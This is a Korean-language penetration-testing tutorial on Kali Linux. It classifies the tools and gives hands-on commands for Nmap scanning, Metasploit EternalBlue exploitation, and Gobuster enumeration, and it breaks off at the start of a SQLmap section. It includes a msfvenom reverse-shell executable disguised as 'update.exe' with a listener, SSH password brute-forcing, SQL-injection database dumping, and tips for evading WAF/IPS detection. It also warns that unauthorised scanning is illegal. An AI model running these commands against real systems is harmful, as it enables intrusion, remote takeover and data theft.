제 1장. 칼리 리눅스 (Kali Linux) 모의해킹 도구 분류 체계

칼리 리눅스는 정보 보안 전문가와 모의해킹(Penetration Testing, 페너트레이션 테스팅) 컨설턴트를 위해 Offensive Security(오펜시브 시큐리티)사에서 데비안(Debian) 기반으로 제작한 운영체제입니다. 실무에서 수행하는 PT(Penetration Testing, 모의해킹) 방법론의 단계에 맞추어 도구들이 체계적으로 분류되어 있습니다.

아래는 실무 환경에서 가장 빈번하게 사용되는 핵심 카테고리와 대표적인 CLI (Command Line Interface, 명령줄 인터페이스) 도구들의 목록입니다.

분류 (Category) 대표 도구명 주요 특징 및 역할 CLI 기본 예제 (Basic Command)
정보 수집
(Information Gathering)		 Nmap 네트워크 호스트 탐지, 열린 포트(Port) 및 서비스 버전, OS(운영체제) 식별 nmap -sn 192.168.1.0/24
취약점 분석
(Vulnerability Analysis)		 Searchsploit 오프라인 Exploit-DB(익스플로잇 데이터베이스) 아카이브 검색 도구 searchsploit windows smb
웹 앱 분석
(Web App Analysis)		 Gobuster 웹 디렉터리, 파일, DNS 서브도메인 브루트 포싱(무차별 대입) 탐색 gobuster dir -u http://example.com -w wordlist.txt
데이터베이스 평가
(Database Assessment)		 SQLmap SQL Injection(SQL 삽입) 취약점 자동 탐지 및 데이터베이스 탈취 sqlmap -u "http://example.com/id=1" --dbs
비밀번호 공격
(Password Attacks)		 Hydra 다양한 네트워크 프로토콜(SSH, FTP 등) 대상 병렬 로그인 크래킹 hydra -l admin -P pass.txt ssh://192.168.1.10
익스플로잇 도구
(Exploitation Tools)		 Metasploit 취약점 검증 및 페이로드(Payload) 전송을 위한 통합 프레임워크 msfconsole
* CLI (Command Line Interface, 명령줄 인터페이스): 마우스 클릭 기반의 그래픽 화면(GUI)이 아닌, 터미널 창에서 텍스트 명령어를 직접 입력하여 컴퓨터와 상호작용하는 환경입니다.
* Exploit (익스플로잇): 시스템이나 소프트웨어의 취약점을 이용하여 공격자가 의도한 동작(권한 상승, 원격 명령 실행 등)을 수행하게 만드는 코드나 프로그램입니다.

제 2장. 핵심 모의해킹 도구 실무 가이드 (Top 6)

1. Nmap (Network Mapper) - 네트워크 자산 및 포트 스캐너

Nmap은 네트워크에 연결된 기기(호스트)를 식별하고, 해당 기기에서 어떤 서비스(포트)가 실행 중인지, 어떤 운영체제(OS)를 사용하는지 탐지하는 사실상의 업계 표준 도구입니다. 정보 수집 단계에서 가장 먼저 실행되는 도구입니다.

실무 실습 명령 예제

예제 1: 대역폭 내 살아있는 호스트 탐지 (Ping Scan)
네트워크 대역 내에서 현재 동작 중인 IP 목록만 빠르게 추출할 때 사용합니다. 포트 스캔은 생략합니다.

# 10.10.10.0 부터 10.10.10.255 까지의 C클래스 대역 스캔
nmap -sn 10.10.10.0/24

예제 2: 서비스 버전 및 특정 포트 정밀 스캔
발견된 특정 IP(예: 192.168.50.15)를 대상으로 1번부터 65535번까지 모든 포트를 스캔하고, 실행 중인 서비스의 정확한 버전을 배너 그랩(Banner Grabbing)을 통해 알아냅니다.

# -p- 는 1-65535 전체 포트를 의미하며, -sV는 버전 탐지를 의미함
nmap -p- -sV 192.168.50.15

예제 3: 공격적인 종합 스캔 (OS 탐지, 스크립트 스캔, 라우팅 추적)
대상 서버(nmap 공식 테스트 서버)의 운영체제, 취약점 스크립트 엔진(NSE) 구동 등 포괄적인 정보를 한 번에 수집합니다.

# -A는 공격적(Aggressive) 옵션, -T4는 스캔 속도(빠름)를 의미함
nmap -A -T4 scanme.nmap.org

예제 4: 방화벽 우회를 위한 은닉 스캔 (Stealth SYN Scan)
TCP 3-Way Handshake(연결 수립 과정)를 완전히 맺지 않고 RST 패킷을 보내 연결을 끊음으로써 시스템 로그에 스캔 기록을 덜 남기려는 기법입니다.

# -sS는 SYN 스캔 옵션으로, 실행을 위해 관리자(root) 권한인 sudo가 필요함
sudo nmap -sS 192.168.50.22
실무에서 고객사 망을 스캔할 때는 -oA 옵션을 추가하여 스캔 결과를 XML, Nmap, Grepable 3가지 포맷으로 반드시 저장해야 합니다. (예: nmap -sV 10.0.0.1 -oA /home/kali/scan_result). 보고서 작성과 나중의 증적으로 활용됩니다.
사전 협의(승인)되지 않은 외부 공인 IP나 타 기업의 도메인에 Nmap 스캔을 수행하는 것은 정보통신망법 위반 소지가 있는 불법 행위입니다. 반드시 허가된 자사망이나 모의해킹 동의서가 작성된 타겟에만 실행해야 합니다.

2. Metasploit Framework (메타스플로잇 프레임워크) - 통합 익스플로잇 도구

발견된 시스템의 취약점을 실제로 공격(Exploitation)하여 제어권을 획득(쉘 획득)하는 데 사용되는 세계에서 가장 널리 쓰이는 오픈소스 해킹 프레임워크입니다. 공격 코드, 페이로드(Payload), 인코더(Encoder)가 모듈화되어 있습니다.

실무 실습 명령 예제

예제 1: 콘솔 실행 및 특정 취약점 검색
MSF 콘솔을 실행하고, 악명 높은 Windows SMB 취약점인 EternalBlue(MS17-010) 공격 모듈을 검색합니다.

# 칼리 터미널에서 프레임워크 실행
msfconsole

# (msf6 > 프롬프트 상태에서) 취약점 검색
msf6 > search type:exploit platform:windows smb ms17_010

예제 2: 타겟 설정 및 공격 실행 (Exploit)
검색된 공격 모듈을 선택하고, 타겟 서버(RHOSTS) IP를 설정한 뒤 공격을 감행합니다.

# 공격 모듈 선택
msf6 > use exploit/windows/smb/ms17_010_eternalblue

# 타겟 IP 주소 192.168.100.50 셋팅
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.100.50

# 옵션 확인 후 공격 실행
msf6 exploit(...) > show options
msf6 exploit(...) > exploit

예제 3: 백도어 생성 (msfvenom 활용)
Metasploit 프레임워크의 도구인 `msfvenom`을 사용하여 타겟 PC에서 실행할 악성코드(리버스 쉘 실행 파일)를 직접 생성합니다.

# 공격자(나)의 IP가 10.10.14.5 이고 4444 포트로 연결을 받도록 설정된 Windows용 exe 파일 생성
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe > update.exe

예제 4: 핸들러(Listener) 실행하여 연결 대기
위에서 생성한 `update.exe`를 타겟이 실행했을 때, 들어오는 연결(Reverse Connection)을 받아주기 위해 리스너를 열어둡니다.

msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.10.14.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > run
# 이제 타겟이 파일을 실행하면 세션이 맺어집니다.
Payload(페이로드)란? 공격이 성공한 직후 타겟 시스템에서 실행되는 '실제 목적 코드'입니다. 보통 공격자와 통신할 수 있는 Meterpreter(미터프리터 - 강력한 쉘 환경)나 Command Shell(명령 프롬프트)을 열어주는 역할을 합니다.
LHOST(Local Host, 공격자 IP)와 RHOSTS(Remote Hosts, 타겟 IP)를 헷갈려 자신을 공격하거나 세션이 맺어지지 않는 실수가 잦습니다. 항상 options 명령어로 IP 설정을 재확인하세요.

3. Gobuster (고버스터) - 웹 디렉터리 및 서브도메인 탐색기

웹 서버에 숨겨져 있는 디렉터리, 관리자 페이지, 백업 파일, 서브도메인 등을 Wordlist(사전 파일)를 기반으로 무차별 대입(Brute-Force)하여 초고속으로 찾아내는 Go 언어 기반의 CLI 도구입니다.

실무 실습 명령 예제

예제 1: 기본 웹 디렉터리 탐색 (Directory Enumeration)
타겟 웹사이트의 숨겨진 경로(예: /admin, /backup)를 칼리 리눅스에 내장된 사전 파일을 이용해 탐색합니다.

# -u는 타겟 URL, -w는 사전 파일 경로입니다.
gobuster dir -u http://192.168.50.80 -w /usr/share/wordlists/dirb/common.txt

예제 2: 특정 확장자 파일 집중 탐색
디렉터리뿐만 아니라 숨겨진 PHP 소스 코드나 텍스트, 백업 확장자를 가진 특정 파일을 찾습니다.

# -x 옵션으로 php, txt, zip 확장자를 추가하여 탐색합니다.
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip

예제 3: DNS 서브도메인 스캐닝 (Subdomain Enumeration)
대상 회사의 메인 도메인 외에 개발망, 테스트망 등으로 쓰이는 서브도메인(예: dev.example.com)을 찾습니다.

# dns 모드를 사용하고 -d로 타겟 도메인을 명시합니다.
gobuster dns -d example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
웹 스캐닝을 할 때 스레드(Thread) 속도가 너무 빠르면 대상 웹 서버의 방화벽(WAF)이나 IPS(침입방지시스템)에 차단당할 수 있습니다. -t 10 과 같이 스레드 수를 조절하거나 --delay 옵션을 주어 탐지율을 낮추는 전략이 필요합니다.

4. SQLmap (에스큐엘맵) - 자동화된 데이터베이스 탈취 도구

웹 애플리케이션의 URL 파라미터나 폼 데이터에 존재하는 SQL Injection(SQL 삽입) 취약점을 자동으로 탐지하고, 대상 DB(데이터베이스)의 구조를 파악하여 내부 데이터를 통째로 추출(Dump)해내는 강력한 파이썬 기반 도구입니다.
